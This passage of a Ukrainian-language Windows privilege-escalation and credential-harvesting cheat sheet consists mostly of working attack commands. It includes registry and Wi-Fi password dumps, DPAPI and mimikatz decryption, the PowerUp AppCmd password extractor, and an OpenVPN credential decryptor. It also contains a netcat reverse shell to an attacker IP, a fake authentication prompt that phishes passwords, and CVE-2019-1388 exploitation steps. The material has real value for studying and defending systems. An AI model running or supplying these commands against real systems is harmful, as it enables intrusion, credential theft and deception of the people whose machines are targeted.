Ви можете дослідити файлову систему `WSL` у папці `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Менеджер облікових даних / Сховище Windows

З [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Сховище Windows зберігає облікові дані користувачів для серверів, веб-сайтів та інших програм, які **Windows** може **автоматично входити в систему**. На перший погляд, це може виглядати так, ніби користувачі можуть зберігати свої облікові дані Facebook, Twitter, Gmail тощо, щоб автоматично входити через браузери. Але це не так.

Сховище Windows зберігає облікові дані, за якими Windows може автоматично входити в систему, що означає, що будь-яка **Windows програма, яка потребує облікових даних для доступу до ресурсу** (сервера або веб-сайту) **може використовувати цей Менеджер облікових даних** та Сховище Windows і використовувати надані облікові дані замість того, щоб користувачі постійно вводили ім'я користувача та пароль.

Якщо програми не взаємодіють з Менеджером облікових даних, я не думаю, що вони можуть використовувати облікові дані для даного ресурсу. Тож, якщо ваша програма хоче використовувати сховище, вона повинна якимось чином **взаємодіяти з менеджером облікових даних і запитувати облікові дані для цього ресурсу** з сховища за замовчуванням.

Використовуйте `cmdkey`, щоб перерахувати збережені облікові дані на машині.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Тоді ви можете використовувати `runas` з параметрами `/savecred`, щоб використовувати збережені облікові дані. Наступний приклад викликає віддалений бінарний файл через SMB-спільний доступ.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Використання `runas` з наданим набором облікових даних.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Зверніть увагу, що mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) або з [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

**API захисту даних (DPAPI)** надає метод симетричного шифрування даних, переважно використовується в операційній системі Windows для симетричного шифрування асиметричних приватних ключів. Це шифрування використовує секрети користувача або системи, щоб значно сприяти ентропії.

**DPAPI дозволяє шифрування ключів за допомогою симетричного ключа, який отримується з секретів входу користувача**. У сценаріях, що стосуються шифрування системи, він використовує секрети аутентифікації домену системи.

Зашифровані RSA ключі користувача, за допомогою DPAPI, зберігаються в каталозі `%APPDATA%\Microsoft\Protect\{SID}`, де `{SID}` представляє [ідентифікатор безпеки](https://en.wikipedia.org/wiki/Security_Identifier) користувача. **Ключ DPAPI, розташований разом з майстер-ключем, який захищає приватні ключі користувача в одному файлі**, зазвичай складається з 64 байтів випадкових даних. (Важливо зазначити, що доступ до цього каталогу обмежений, що заважає перерахунку його вмісту за допомогою команди `dir` у CMD, хоча його можна перерахувати через PowerShell).
```powershell
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Ви можете використовувати **mimikatz module** `dpapi::masterkey` з відповідними аргументами (`/pvk` або `/rpc`), щоб розшифрувати його.

**файли облікових даних, захищені майстер-паролем**, зазвичай розташовані в:
```powershell
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Ви можете використовувати **mimikatz module** `dpapi::cred` з відповідним `/masterkey` для розшифровки.\
Ви можете **витягнути багато DPAPI** **masterkeys** з **пам'яті** за допомогою модуля `sekurlsa::dpapi` (якщо ви root).

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**Облікові дані PowerShell** часто використовуються для **скриптування** та автоматизації завдань як спосіб зберігати зашифровані облікові дані зручно. Облікові дані захищені за допомогою **DPAPI**, що зазвичай означає, що їх можна розшифрувати лише тим же користувачем на тому ж комп'ютері, на якому вони були створені.

Щоб **розшифрувати** облікові дані PS з файлу, що їх містить, ви можете зробити:
```powershell
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Збережені RDP з'єднання

Ви можете знайти їх за адресою `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
та в `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Нещодавно виконані команди
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Менеджер облікових даних віддаленого робочого столу**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Використовуйте модуль **Mimikatz** `dpapi::rdg` з відповідним `/masterkey`, щоб **розшифрувати будь-які .rdg файли**\
Ви можете **витягнути багато DPAPI masterkeys** з пам'яті за допомогою модуля Mimikatz `sekurlsa::dpapi`

### Sticky Notes

Люди часто використовують додаток StickyNotes на робочих станціях Windows, щоб **зберігати паролі** та іншу інформацію, не усвідомлюючи, що це файл бази даних. Цей файл знаходиться за адресою `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` і завжди варто його шукати та перевіряти.

### AppCmd.exe

**Зверніть увагу, що для відновлення паролів з AppCmd.exe вам потрібно бути адміністратором і працювати під високим рівнем цілісності.**\
**AppCmd.exe** знаходиться в каталозі `%systemroot%\system32\inetsrv\` .\
Якщо цей файл існує, то можливо, що деякі **облікові дані** були налаштовані і можуть бути **відновлені**.

Цей код був витягнутий з [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Перевірте, чи існує `C:\Windows\CCM\SCClient.exe` .\
Інсталятори **виконуються з привілеями SYSTEM**, багато з них вразливі до **DLL Sideloading (Інформація з** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Файли та Реєстр (Облікові дані)

### Облікові дані Putty
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Ключі хостів Putty SSH
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH ключі в реєстрі

SSH приватні ключі можуть зберігатися в реєстрі за ключем `HKCU\Software\OpenSSH\Agent\Keys`, тому вам слід перевірити, чи є там щось цікаве:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Якщо ви знайдете будь-який запис у цьому шляху, це, ймовірно, буде збережений SSH-ключ. Він зберігається в зашифрованому вигляді, але може бути легко розшифрований за допомогою [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Більше інформації про цю техніку тут: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Якщо служба `ssh-agent` не працює і ви хочете, щоб вона автоматично запускалася при завантаженні, виконайте:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!NOTE]
> Схоже, що ця техніка більше не дійсна. Я намагався створити кілька ssh ключів, додати їх за допомогою `ssh-add` і увійти через ssh на машину. Реєстр HKCU\Software\OpenSSH\Agent\Keys не існує, а procmon не виявив використання `dpapi.dll` під час асиметричної аутентифікації ключа.

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Ви також можете шукати ці файли, використовуючи **metasploit**: _post/windows/gather/enum_unattend_
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Резервні копії SAM та SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Облікові дані хмари
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Шукайте файл під назвою **SiteList.xml**

### Cached GPP Pasword

Раніше була доступна функція, яка дозволяла розгортання користувацьких локальних облікових записів адміністратора на групі машин через Group Policy Preferences (GPP). Однак цей метод мав значні недоліки в безпеці. По-перше, об'єкти групової політики (GPO), збережені як XML файли в SYSVOL, могли бути доступні будь-якому користувачу домену. По-друге, паролі в цих GPP, зашифровані за допомогою AES256 з використанням публічно задокументованого ключа за замовчуванням, могли бути розшифровані будь-яким автентифікованим користувачем. Це становило серйозний ризик, оскільки могло дозволити користувачам отримати підвищені привілеї.

Щоб зменшити цей ризик, була розроблена функція для сканування локально кешованих GPP файлів, що містять поле "cpassword", яке не є порожнім. Після знаходження такого файлу функція розшифровує пароль і повертає користувацький об'єкт PowerShell. Цей об'єкт містить деталі про GPP та місцезнаходження файлу, що допомагає в ідентифікації та усуненні цієї вразливості в безпеці.

Шукайте в `C:\ProgramData\Microsoft\Group Policy\history` або в _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (до W Vista)_ ці файли:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Щоб розшифрувати cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Використання crackmapexec для отримання паролів:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Приклад web.config з обліковими даними:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Облікові дані OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Логи
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Запит на облікові дані

Ви завжди можете **попросити користувача ввести свої облікові дані або навіть облікові дані іншого користувача**, якщо вважаєте, що він може їх знати (зверніть увагу, що **питання** клієнта безпосередньо про **облікові дані** є дійсно **ризикованим**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Можливі імена файлів, що містять облікові дані**

Відомі файли, які деякий час тому містили **паролі** у **відкритому тексті** або **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Шукайте всі запропоновані файли:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Облікові дані в Кошику

Вам також слід перевірити Кошик на наявність облікових даних всередині нього

Щоб **відновити паролі**, збережені кількома програмами, ви можете використовувати: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Всередині реєстру

**Інші можливі ключі реєстру з обліковими даними**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Витягніть ключі openssh з реєстру.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Історія браузерів

Вам слід перевірити бази даних, де зберігаються паролі з **Chrome або Firefox**.\
Також перевірте історію, закладки та улюблені сторінки браузерів, можливо, там зберігаються деякі **паролі**.

Інструменти для витягування паролів з браузерів:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **Перезапис DLL COM**

**Компонентна об'єктна модель (COM)** - це технологія, вбудована в операційну систему Windows, яка дозволяє **взаємодію** між програмними компонентами різних мов. Кожен компонент COM **ідентифікується за допомогою ідентифікатора класу (CLSID)**, а кожен компонент надає функціональність через один або кілька інтерфейсів, які ідентифікуються за допомогою ідентифікаторів інтерфейсу (IIDs).

Класи та інтерфейси COM визначені в реєстрі під **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** та **HKEY\_**_**CLASSES\_**_**ROOT\Interface** відповідно. Цей реєстр створюється шляхом об'єднання **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT.**

Всередині CLSID цього реєстру ви можете знайти дочірній реєстр **InProcServer32**, який містить **значення за замовчуванням**, що вказує на **DLL**, та значення під назвою **ThreadingModel**, яке може бути **Apartment** (однопотоковий), **Free** (багатопотоковий), **Both** (один або кілька) або **Neutral** (нейтральний до потоків).

![](<../../images/image (729).png>)

В основному, якщо ви можете **перезаписати будь-які з DLL**, які будуть виконані, ви могли б **підвищити привілеї**, якщо ця DLL буде виконана іншим користувачем.

Щоб дізнатися, як зловмисники використовують COM Hijacking як механізм стійкості, перевірте:

{{#ref}}
com-hijacking.md
{{#endref}}

### **Загальний пошук паролів у файлах та реєстрі**

**Шукайте вміст файлів**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Шукати файл з певною назвою**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Шукайте в реєстрі імена ключів та паролі**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Інструменти для пошуку паролів

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **є плагіном msf**, який я створив, щоб **автоматично виконувати кожен модуль POST metasploit, що шукає облікові дані** всередині жертви.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) автоматично шукає всі файли, що містять паролі, згадані на цій сторінці.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) є ще одним чудовим інструментом для витягування паролів з системи.

Інструмент [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) шукає **сесії**, **імена користувачів** та **паролі** кількох інструментів, які зберігають ці дані у відкритому тексті (PuTTY, WinSCP, FileZilla, SuperPuTTY та RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Уявіть, що **процес, що працює як SYSTEM, відкриває новий процес** (`OpenProcess()`) з **повним доступом**. Той же процес **також створює новий процес** (`CreateProcess()`) **з низькими привілеями, але успадковує всі відкриті дескриптори основного процесу**.\
Тоді, якщо у вас є **повний доступ до процесу з низькими привілеями**, ви можете отримати **відкритий дескриптор до привілейованого процесу, створеного** з `OpenProcess()` і **інжектувати shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Спільні сегменти пам'яті, відомі як **трубопроводи**, дозволяють процесам спілкуватися та передавати дані.

Windows надає функцію під назвою **Named Pipes**, що дозволяє несумісним процесам ділитися даними, навіть через різні мережі. Це нагадує архітектуру клієнт/сервер, з ролями, визначеними як **сервер іменованих трубопроводів** та **клієнт іменованих трубопроводів**.

Коли дані надсилаються через трубопровід **клієнтом**, **сервер**, який налаштував трубопровід, має можливість **прийняти особистість** **клієнта**, якщо у нього є необхідні **SeImpersonate** права. Визначення **привілейованого процесу**, який спілкується через трубопровід, особистість якого ви можете імітувати, надає можливість **отримати вищі привілеї**, прийнявши особистість цього процесу, як тільки він взаємодіє з трубопроводом, який ви створили. Для інструкцій щодо виконання такого нападу корисні посібники можна знайти [**here**](named-pipe-client-impersonation.md) та [**here**](#from-high-integrity-to-system).

Також наступний інструмент дозволяє **перехоплювати комунікацію іменованого трубопроводу за допомогою інструменту, такого як burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **і цей інструмент дозволяє перерахувати та переглянути всі трубопроводи для пошуку privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Misc

### **Monitoring Command Lines for passwords**

Коли ви отримуєте shell як користувач, можуть бути заплановані завдання або інші процеси, які **передають облікові дані через командний рядок**. Скрипт нижче захоплює командні рядки процесів кожні дві секунди та порівнює поточний стан з попереднім, виводячи будь-які відмінності.
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Вкрадання паролів з процесів

## Від низького привілейованого користувача до NT\AUTHORITY SYSTEM (CVE-2019-1388) / Обхід UAC

Якщо у вас є доступ до графічного інтерфейсу (через консоль або RDP) і UAC увімкнено, в деяких версіях Microsoft Windows можливо запустити термінал або будь-який інший процес, такий як "NT\AUTHORITY SYSTEM", з непривабливого користувача.

Це дозволяє підвищити привілеї та обійти UAC одночасно з тією ж вразливістю. Крім того, немає необхідності нічого встановлювати, а бінарний файл, що використовується під час процесу, підписаний і виданий Microsoft.

Деякі з уражених систем такі:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Щоб експлуатувати цю вразливість, необхідно виконати наступні кроки:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
Ви маєте всі необхідні файли та інформацію в наступному репозиторії GitHub:

https://github.com/jas502n/CVE-2019-1388

## Від середнього до високого рівня цілісності адміністратора / обхід UAC

Прочитайте це, щоб **дізнатися про рівні цілісності**:

{{#ref}}
integrity-levels.md
{{#endref}}

Потім **прочитайте це, щоб дізнатися про UAC та обходи UAC:**

{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## **Від високого рівня цілісності до системи**

### **Новий сервіс**

Якщо ви вже працюєте на процесі з високим рівнем цілісності, **перехід до SYSTEM** може бути простим, просто **створивши та виконуючи новий сервіс**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

З процесу з високою цілісністю ви можете спробувати **увімкнути записи реєстру AlwaysInstallElevated** та **встановити** зворотний шелл, використовуючи _**.msi**_ обгортку.\
[Більше інформації про залучені ключі реєстру та як встановити _.msi_ пакет тут.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Ви можете** [**знайти код тут**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Якщо у вас є ці токен-привілеї (ймовірно, ви знайдете це в уже існуючому процесі з високою цілісністю), ви зможете **відкрити майже будь-який процес** (не захищені процеси) з привілеєм SeDebug, **скопіювати токен** процесу та створити **процес з цим токеном**.\
Використовуючи цю техніку, зазвичай **вибирається будь-який процес, що працює як SYSTEM з усіма токен-привілеями** (_так, ви можете знайти процеси SYSTEM без усіх токен-привілеїв_).\
